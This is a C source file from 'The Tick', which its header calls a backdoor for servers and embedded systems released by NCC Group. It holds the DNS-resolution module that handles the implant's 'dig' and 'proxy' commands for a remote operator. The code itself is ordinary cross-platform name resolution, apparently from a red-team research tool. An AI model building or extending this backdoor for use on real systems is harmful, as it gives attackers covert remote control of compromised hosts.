/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "dns.h"

// Performs a DNS resolution.
size_t resolve_hostname(const char *hostname, char *output, size_t size, int *out_entries, size_t *out_size)
{
    // This function must try to resolve both IPv4 and IPv6.
    //
    // The tricky part here is the GNU libc is a lot smarter for this,
    // but it also introduces a dynamic dependency on libnss on Linux,
    // which makes our binaries non portable - hence we switched to
    // numl libc, which is lean and can be linked statically; but not
    // so "smart", since it actually follows POSIX but that kinda sucks.
    //
    // Second tricky part: on Windows, there is a bug in all of the libc
    // versions I tried (could be Windows, could be mingw?) where the
    // ai_protocol value is always 0 instead of IPPROTO_TCP.
    //
    // Ok, third tricky part. Android has a very buggy implementation
    // of getaddrinfo() that breaks on certain combinations of hints,
    // and these combinations may be dependent on the Android version.
    // The safest bet seems to be using gethostbyname() instead, because
    // that's what the Dalvik code uses.
    // See: https://groups.google.com/g/android-ndk/c/CBirnFPyTIc

    int entries = 0;
    size_t resp_size = 0;
    size_t total_size = 0;
    char *end_of_buffer = output + size;
    memset(output, 0, size);
    LOG("Resolving domain: %s\n", hostname);

#ifdef __ANDROID__

    // Android version, using gethostbyname(). Note that this call is
    // racy by design, so we cannot use pthreads. We don't anyway,
    // this is more of a future-proof comment. :)
    struct hostent *hp = gethostbyname(hostname);
    if (hp == NULL ||
            ! ( (hp->h_addrtype == AF_INET  && hp->h_length == 4) ||
                (hp->h_addrtype == AF_INET6 && hp->h_length == 16) )) {
        return 0;
    }

    // Calculate the size of the response structure.
    // The response will be an array of structures in this format:
    //      BYTE                family (AF_INET or AF_INET6)
    //      UCHAR[4 or 16]      address (IPv4 or IPv6)
    //
    // Since gethostbyname() can only return *either* IPv4 or IPv6,
    // we know our array size directly from the number of entries.
    char addrtype = hp->h_addrtype;
    uint32_t addrsize = hp->h_length;
    unsigned int i = 0;
    while (hp->h_addr_list[i] != NULL) {
        entries++;
        i++;
    }
    total_size = entries * (1 + addrsize);
    LOG("Found %d address(es)\n", entries);

    // Write the addresses into the output buffer.
    i = 0;
    resp_size = 0;
    while (hp->h_addr_list[i] != NULL) {
        if (output + addrsize + 1 > end_of_buffer) break;
        memcpy(output, &addrtype, 1);
        memcpy(output + 1, hp->h_addr_list[i], addrsize);
        output += addrsize + 1;
        resp_size += addrsize + 1;
        i++;
    }

#else

    // All other platforms version, using getaddrinfo().
    struct addrinfo* result = NULL;
    struct addrinfo* res = NULL;
    struct addrinfo hints;
    memset((void *) &hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;    // seems to be ignored on Windows?
#ifndef _WIN32
    hints.ai_flags = AI_ADDRCONFIG | AI_V4MAPPED;   // force gnu libc defaults
            // the above actually works with musl but not standard mingw... :(
            // should be available since Windows Vista
#endif
    if (getaddrinfo(hostname, NULL, NULL, &result) != 0) {
        LOG("Failed to resolve domain\n");
        return 0;
    }

    // Calculate the size of the response structure.
    // The response will be an array of structures in this format:
    //      BYTE                family (AF_INET or AF_INET6)
    //      UCHAR[4 or 16]      address (IPv4 or IPv6)
    entries = 0;
    for (res = result; res != NULL; res = res->ai_next) {
#ifdef _WIN32
        // ai_protocol is 0 on Windows, seems to be a bug???
        // doesn't matter if it's regular or musl mingw
        if (res->ai_protocol == 0) res->ai_protocol = IPPROTO_TCP;
#endif
        if (res->ai_family == AF_INET && (res->ai_protocol == IPPROTO_TCP)) {
            total_size += 5;
            entries++;
        } else if (res->ai_family == AF_INET6 && res->ai_protocol == IPPROTO_TCP) {
            total_size += 17;
            entries++;
        } else {
            // Skip other entries.
        }
    }
    LOG("Found %d address(es)\n", entries);

    // Write the addresses into the output buffer.
    for (res = result; res != NULL; res = res->ai_next) {
        if (res->ai_family == AF_INET && res->ai_protocol == IPPROTO_TCP) {
            if (output + 5 > end_of_buffer) break;
            memcpy(output, &res->ai_family, 1);
            memcpy(output + 1, &((struct sockaddr_in *) res->ai_addr)->sin_addr, 4);
            output += 5;
            resp_size += 5;
        } else if (res->ai_family == AF_INET6 && res->ai_protocol == IPPROTO_TCP) {
            if (output + 17 > end_of_buffer) continue;  // not break
            memcpy(output, &res->ai_family, 1);
            memcpy(output + 1, &((struct sockaddr_in6 *) res->ai_addr)->sin6_addr, 16);
            output += 17;
            resp_size += 17;
        } else {
            // Skip other entries.
        }
    }

    // Free the getaddrinfo() linked list.
    freeaddrinfo(result);

#endif

    // If the pointer is set, write the number of entries and total size.
    if (out_entries != NULL) *out_entries = entries;
    if (out_size != NULL) *out_size = total_size;

    // Return the number of bytes actually written.
    return resp_size;
}

// Implements the "dig" command.
// Also used internally by the "proxy" command.
void do_dns_resolve(Parser *p)
{
    // The first argument is the domain name to resolve.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "domain name too long");
        return;
    }

    // Since typically a DNS response is limited by 512 bytes (about 13
    // IP addresses) we use a fixed size buffer too for the response to
    // this call. A 256 byte buffer should suffice in most cases, since
    // our response structure is smaller and simpler.
    char resp_buffer[256];

    // Resolve the domain name.
    uint32_t resp_size = (uint32_t) resolve_hostname(
        p->buffer,
        resp_buffer, sizeof(resp_buffer),
        NULL, NULL);

    // Send the response back.
    if (resp_size == 0) {
        parser_error(p, "could not resolve domain name");
        return;
    }
    parser_begin_response(p, CMD_STATUS_OK, resp_size);
    parser_send_block(p, resp_buffer, resp_size);
}
